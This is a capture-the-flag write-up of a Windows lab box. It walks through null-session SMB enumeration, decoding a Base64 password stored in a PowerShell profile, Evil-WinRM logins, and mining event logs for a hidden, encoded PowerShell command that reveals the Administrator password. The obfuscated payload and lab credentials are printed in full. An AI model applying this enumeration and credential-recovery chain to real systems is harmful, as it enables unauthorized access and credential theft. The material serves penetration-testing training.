---
description: Proving Grounds PG Practice Compromised writeup
---

# Compromised

## Nmap

```bash
sudo nmap 192.168.178.152  -p- -sS -sV

PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
445/tcp   open  microsoft-ds?
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49666/tcp open  msrpc         Microsoft Windows RPC
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Jumping in immediately over to `SMB` for any low hanging fruit we can see can authenticate with null credentials and list the available shares.

```bash
└─$ smbclient -U '' -L \\\\192.168.178.152   
  
Enter WORKGROUP\'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Scripts$        Disk      
        Users$          Disk      
SMB1 disabled -- no workgroup available
```

```
└─$ smbclient -U '' \\\\192.168.178.152\\Scripts$   
                                                                                                            1 ⨯
Enter WORKGROUP\'s password: 
Try "help" to get a list of possible commands.
smb: \> dir

  .                                   D        0  Tue Jun  1 10:57:45 2021
  ..                                  D        0  Tue Jun  1 10:57:45 2021
  defrag.ps1                          A       49  Tue Jun  1 10:57:45 2021
  fix-printservers.ps1                A      283  Tue Jun  1 10:57:45 2021
  install-features.ps1                A       81  Tue Jun  1 10:57:45 2021
  purge-temp.ps1                      A      105  Tue Jun  1 10:57:45 2021

                7706623 blocks of size 4096. 3766380 blocks available
```

From here we can see four separate `PowerShell` .ps1 files. I downloaded all the available files which have been listed below:

![](<../../../.gitbook/assets/image (1924).png>)

{% tabs %}
{% tab title="Defrag.ps1" %}
```c
Optimize-Volume -DriveLetter C -Defrag -Verbose
```
{% endtab %}

{% tab title="fix-printservers.ps1" %}
```c
$credential = New-Object System.Management.Automation.PSCredential ('scripting', $password)
$spooler = Get-WmiObject -Class Win32_Service -ComputerName (Read-Host -Prompt 'Server Name') -Credential $credential -Filter "Name='spooler'"
$spooler.stopservice()
$spooler.startservice()
```
{% endtab %}

{% tab title="install-features.ps1" %}
```c
Install-WindowsFeature -Name WindowsPowerShellWebAccess -IncludeManagementTools
```
{% endtab %}

{% tab title="purge-temp.ps1" %}
```c
rm "C:\Users\*\Appdata\Local\Temp\*" "c:\Windows\Temp\*"  -Recurse -Force -ErrorAction SilentlyContinue
```
{% endtab %}
{% endtabs %}

However, after going through these files they do not appear to be related directly to any exploitation.

Examining the Users$ `SMB` Share we see that the c:\users directory is mapped as a share. Typically the Administrators user folder is off limits. We are however able to access the entire user directory for the user 'scripting'.

![](<../../../.gitbook/assets/image (1925).png>)

Whilst this produces a large amount of files and directories we can instead utilize the `smbmap` tool to assist with recursively going through each directory for interesting files.

```bash
smbmap -u null -p null -H <IP> -s Scripting$ -R
```

Where once finished we find the following files of interest:

![](<../../../.gitbook/assets/image (1926).png>)

Using `smbclient` we can download `README.txt` from the user scripting's Desktop.

{% tabs %}
{% tab title="README.txt" %}
```
Please keep your personal shares locked down. 
Just because it's hidden it doesn't mean it's not accessible. 
Also, please stop storing passwords in your scripts. 
Encoding is not encryption and this information can be lifted from the logs. 
-Security
```
{% endtab %}
{% endtabs %}

We also have a file called profile.ps1 located in `c:\users\scripting\Documents\WindowsPowerShell`.

```c
$password = ConvertTo-SecureString "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RgByAGkAZQBuAGQAcwBEAG8AbgB0AEwAZQB0AEYAcgBpAGUAbgBkAHMAQgBhAHMAZQA2ADQAUABhAHMAcwB3AG8AcgBkAHMA')))" |
-AsPlainText -Force
```

Extracting the Base64 string from the script and running it through base64 we find a potential password string.

```bash
echo 'RgByAGkAZQBuAGQAcwBEAG8AbgB0AEwAZQB0AEYAcgBpAGUAbgBkAHMAQgBhAHMAZQA2ADQAUABhAHMAcwB3AG8AcgBkAHMA' | base64 -d  
```

![](<../../../.gitbook/assets/image (1927).png>)

We have the credentials of `scripting:FriendsDontLetFriendsBase64Passwords` Considering port 5985 is open we can test the credentials using `Evil-WinRM`.

```bash
evil-winrm -i <IP> -u 'scripting' -p 'FriendsDontLetFriendsBase64Passwords'
```

![](<../../../.gitbook/assets/image (1928).png>)

Interestingly checking the users group memberships we see the user scripting is a member of the 'Event Log Readers' group.

![](<../../../.gitbook/assets/image (1929).png>)

Often times `PowerShell` commands and scripts that are executed on the system will be logged to the 'Windows PowerShell' event logs.

```
Get-EventLog -LogName 'Windows PowerShell' -Newest 1000 | Select-Object -Property * | out-file c:\users\scripting\logs.txt
```

From the output we notice multiple instances of the command below being execute on the system. As we can tell by the command the payload in encoded in base64.

```
powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Enc JABPAHcAbgBlAGQAIAA9ACAAQAAoACkAOwAkAE8AdwBuAGUAZAAgACsAPQAgAHsAJABEAGUAYwBvAGQAZQBkACAAPQAgAFsAUwB5AHMAdABlAG0ALg
BDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgANABzAEkAQQBBAEEAQQBBAEEAQQBFAEEAQQB2AEoAUwBBADMATwBTAE0AMwBKADgAUwB6ADIAegBVAHoAUABLAE0AbABNAEwAUQByAEoAUwBNAHcATABBAFkAcQBXADUAeABlAGwASwBBAEkAQQAwAD
cAeABrAEgAQgA4AEEAQQBBAEEAPQAiACkAfQA7ACQATwB3AG4AZQBkACAAKwA9ACAAewBbAHMAdAByAGkAbgBnAF0AOgA6AGoAbwBpAG4AKAAnACcALAAgACgAIAAoADgAMwAsADEAMQA2ACwAOQA3ACwAMQAxADQALAAxADEANgAsADQANQAsADgAMwAsADEAMAA4ACwAMQAwADEALAAxADAAMQAsADEAMQ
AyACwAMwAyACwANAA1ACwAOAAzACwAMQAwADEALAA5ADkALAAxADEAMQAsADEAMQAwACwAMQAwADAALAAxADEANQAsADMAMgAsADUAMwApACAAfAAlAHsAIAAoACAAWwBjAGgAYQByAF0AWwBpAG4AdABdACAAJABfACkAfQApACkAIAB8ACAAJgAgACgAKABnAHYAIAAiACoAbQBkAHIAKgAiACkALgBuAG
EAbQBlAFsAMwAsADEAMQAsADIAXQAtAGoAbwBpAG4AJwAnACkAfQA7ACQATwB3AG4AZQBkACAAKwA9ACAAewBpAGYAKAAkAGUAbgB2ADoAYwBvAG0AcAB1AHQAZQByAG4AYQBtAGUAIAAtAGUAcQAgACIAYwBvAG0AcAByAG8AbQBpAHMAZQBkACIAKQAgAHsAZQB4AGkAdAB9AH0AOwAkAE8AdwBuAGUAZA
AgACsAPQAgAHsAWwBzAHQAcgBpAG4AZwBdADoAOgBqAG8AaQBuACgAJwAnACwAIAAoACAAKAAxADAANQAsADEAMAAyACwAMwAyACwANAAwACwAMQAxADYALAAxADAAMQAsADEAMQA1ACwAMQAxADYALAA0ADUALAA5ADkALAAxADEAMQAsADEAMQAwACwAMQAxADAALAAxADAAMQAsADkAOQAsADEAMQA2AC
wAMQAwADUALAAxADEAMQAsADEAMQAwACwAMwAyACwANQA2ACwANAA2ACwANQA2ACwANAA2ACwANQA2ACwANAA2ACwANQA2ACwAMwAyACwANAA1ACwAOAAxACwAMQAxADcALAAxADAANQAsADEAMAAxACwAMQAxADYALAA0ADEALAAzADIALAAxADIAMwAsADEAMAAxACwAMQAyADAALAAxADAANQAsADEAMQ
A2ACwAMQAyADUAKQAgAHwAJQB7ACAAKAAgAFsAYwBoAGEAcgBdAFsAaQBuAHQAXQAgACQAXwApAH0AKQApACAAfAAgACYAIAAoACgAZwB2ACAAIgAqAG0AZAByACoAIgApAC4AbgBhAG0AZQBbADMALAAxADEALAAyAF0ALQBqAG8AaQBuACcAJwApAH0AOwAkAE8AdwBuAGUAZAAgACsAPQAgAHsAWwBzAH
QAcgBpAG4AZwBdADoAOgBqAG8AaQBuACgAJwAnACwAIAAoACAAKAAxADAANQAsADEAMAAyACwAMwAyACwANAAwACwAMwA2ACwAMQAxADEALAAxADEAOQAsADEAMQAwACwAMQAwADEALAAxADAAMAAsADkAMQAsADUAMAAsADkAMwAsADQANgAsADgANAAsADEAMQAxACwAOAAzACwAMQAxADYALAAxADEANA
AsADEAMAA1ACwAMQAxADAALAAxADAAMwAsADQAMAAsADQAMQAsADMAMgAsADQANQAsADEAMQAwACwAMQAwADEALAAzADIALAAzADkALAAxADAANQAsADEAMAAyACwANAAwACwAMwA2ACwAMQAwADEALAAxADEAMAAsADEAMQA4ACwANQA4ACwAOQA5ACwAMQAxADEALAAxADAAOQAsADEAMQAyACwAMQAxAD
cALAAxADEANgAsADEAMAAxACwAMQAxADQALAAxADEAMAAsADkANwAsADEAMAA5ACwAMQAwADEALAAzADIALAA0ADUALAAxADAAMQAsADEAMQAzACwAMwAyACwAMwA0ACwAOQA5ACwAMQAxADEALAAxADAAOQAsADEAMQAyACwAMQAxADQALAAxADEAMQAsADEAMAA5ACwAMQAwADUALAAxADEANQAsADEAMA
AxACwAMQAwADAALAAzADQALAA0ADEALAAzADIALAAxADIAMwAsADEAMAAxACwAMQAyADAALAAxADAANQAsADEAMQA2ACwAMQAyADUALAAzADkALAA0ADEALAAzADIALAAxADIAMwAsADEAMAAxACwAMQAyADAALAAxADAANQAsADEAMQA2ACwAMQAyADUALAAzADIALAA2ADkALAAxADAAOAAsADEAMQA1AC
wAMQAwADEALAAzADIALAAxADIAMwAsADMANgAsADEAMAA5ACwAMQAxADUALAAzADIALAA2ADEALAAzADIALAA0ADAALAA3ADgALAAxADAAMQAsADEAMQA5ACwANAA1ACwANwA5ACwAOQA4ACwAMQAwADYALAAxADAAMQAsADkAOQAsADEAMQA2ACwAMwAyACwAOAAzACwAMQAyADEALAAxADEANQAsADEAMQ
A2ACwAMQAwADEALAAxADAAOQAsADQANgAsADcAMwAsADcAOQAsADQANgAsADcANwAsADEAMAAxACwAMQAwADkALAAxADEAMQAsADEAMQA0ACwAMQAyADEALAA4ADMALAAxADEANgAsADEAMQA0ACwAMQAwADEALAA5ADcALAAxADAAOQAsADQAMAAsADMANgAsADYAOAAsADEAMAAxACwAOQA5ACwAMQAxAD
EALAAxADAAMAAsADEAMAAxACwAMQAwADAALAA0ADQALAA0ADgALAA0ADQALAAzADYALAA2ADgALAAxADAAMQAsADkAOQAsADEAMQAxACwAMQAwADAALAAxADAAMQAsADEAMAAwACwANAA2ACwANwA2ACwAMQAwADEALAAxADEAMAAsADEAMAAzACwAMQAxADYALAAxADAANAAsADQAMQAsADQAMQAsADEAMg
A1ACkAIAB8ACUAewAgACgAIABbAGMAaABhAHIAXQBbAGkAbgB0AF0AIAAkAF8AKQB9ACkAKQAgAHwAIAAmACAAKAAoAGcAdgAgACIAKgBtAGQAcgAqACIAKQAuAG4AYQBtAGUAWwAzACwAMQAxACwAMgBdAC0AagBvAGkAbgAnACcAKQB9ADsAJABPAHcAbgBlAGQAIAArAD0AIAB7AFsAUwB5AHMAdABlAG
0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAbgBpAGMAbwBkAGUALgBHAGUAdABTAHQAcgBpAG4AZwAoAFsAUwB5AHMAdABlAG0ALgBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEsAQQBCAE8AQQBHAFUAQQBkAHcAQQB0AEEARQ
A4AEEAWQBnAEIAcQBBAEcAVQBBAFkAdwBCADAAQQBDAEEAQQBVAHcAQgA1AEEASABNAEEAZABBAEIAbABBAEcAMABBAEwAZwBCAEoAQQBFADgAQQBMAGcAQgBUAEEASABRAEEAYwBnAEIAbABBAEcARQBBAGIAUQBCAFMAQQBHAFUAQQBZAFEAQgBrAEEARwBVAEEAYwBnAEEAbwBBAEUANABBAFoAUQBCAD
MAQQBDADAAQQBUAHcAQgBpAEEARwBvAEEAWgBRAEIAagBBAEgAUQBBAEkAQQBCAFQAQQBIAGsAQQBjAHcAQgAwAEEARwBVAEEAYgBRAEEAdQBBAEUAawBBAFQAdwBBAHUAQQBFAE0AQQBiAHcAQgB0AEEASABBAEEAYwBnAEIAbABBAEgATQBBAGMAdwBCAHAAQQBHADgAQQBiAGcAQQB1AEEARQBjAEEAVw
BnAEIAcABBAEgAQQBBAFUAdwBCADAAQQBIAEkAQQBaAFEAQgBoAEEARwAwAEEASwBBAEEAawBBAEcAMABBAGMAdwBBAHMAQQBDAEEAQQBXAHcAQgBUAEEASABrAEEAYwB3AEIAMABBAEcAVQBBAGIAUQBBAHUAQQBFAGsAQQBUAHcAQQB1AEEARQBNAEEAYgB3AEIAdABBAEgAQQBBAGMAZwBCAGwAQQBIAE
0AQQBjAHcAQgBwAEEARwA4AEEAYgBnAEEAdQBBAEUATQBBAGIAdwBCAHQAQQBIAEEAQQBjAGcAQgBsAEEASABNAEEAYwB3AEIAcABBAEcAOABBAGIAZwBCAE4AQQBHADgAQQBaAEEAQgBsAEEARgAwAEEATwBnAEEANgBBAEUAUQBBAFoAUQBCAGoAQQBHADgAQQBiAFEAQgB3AEEASABJAEEAWgBRAEIAeg
BBAEgATQBBAEsAUQBBAHAAQQBDAGsAQQBMAGcAQgB5AEEARwBVAEEAWQBRAEIAawBBAEgAUQBBAGIAdwBCAGwAQQBHADQAQQBaAEEAQQBvAEEAQwBrAEEAIgApACkAIAB8ACAAaQBlAHgAfQA7ACQATwB3AG4AZQBkACAAfAAgACUAIAB7ACQAXwB8AGkAZQB4AH0A
```

Decoding the string with Base64 reveals the command below:

![](<../../../.gitbook/assets/image (1930).png>)

As we can see we have a lot going on with the decoded script. This writeup will not go into depth on this however references will be provided for further reading. Essentially after slowly breaking down the script and decoding a couple of the lines we see the following is performed:

```
$Decoded = [System.Convert]::FromBase64String("H4sIAAAAAAAEAAvJSA3OSM3J8Sz2zUzPKMlMLQrJSMwLAYqW5xelKAIA07xkHB8AAAA=")
Start-Sleep -Seconds 5
if($env:computername -eq "compromised") {exit}
if (test-connection 8.8.8.8 -Quiet) {exit}
if ($owned[2].ToString() -ne 'if($env:computername -eq "compromised") {exit}') {exit} Else {$ms = (New-Object System.IO.MemoryStream($Decoded,0,$Decoded.Length))}
(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend() | iex
```

Essentially the script will exit on the target system as per the script if the machine cannot ping 8.8.8.8 (Google DNS Servers) and if the machine name is 'compromised' the script will exit. Removing these conditions we are left with the script below.

```
$Decoded = [System.Convert]::FromBase64String("H4sIAAAAAAAEAAvJSA3OSM3J8Sz2zUzPKMlMLQrJSMwLAYqW5xelKAIA07xkHB8AAAA=")
$ms = (New-Object System.IO.MemoryStream($Decoded,0,$Decoded.Length))
(New-Object System.IO.StreamReader(New-Object System.IO.Compression.GZipStream($ms, [System.IO.Compression.CompressionMode]::Decompress))).readtoend()
```

When executed on the target system we are given the Administrator password.

![](<../../../.gitbook/assets/image (1931).png>)

For the credentials: `Administrator:TheShellIsMightierThanTheSword!`

We can then log in as the Administrator using `Evil-WinRM`.

```bash
evil-winrm -i <IP> -u 'Administrator' -p 'TheShellIsMightierThanTheSword!'
```

![](<../../../.gitbook/assets/image (1932).png>)

## References

* [https://docs.microsoft.com/en-us/dotnet/api/system.io.compression.gzipstream?view=net-5.0](https://docs.microsoft.com/en-us/dotnet/api/system.io.compression.gzipstream?view=net-5.0)
* [https://threat.tevora.com/5-minute-forensics-decoding-powershell-payloads/](https://threat.tevora.com/5-minute-forensics-decoding-powershell-payloads/)
* [https://www.offensive-security.com/offsec/powershell-obfuscation/](https://www.offensive-security.com/offsec/powershell-obfuscation/)
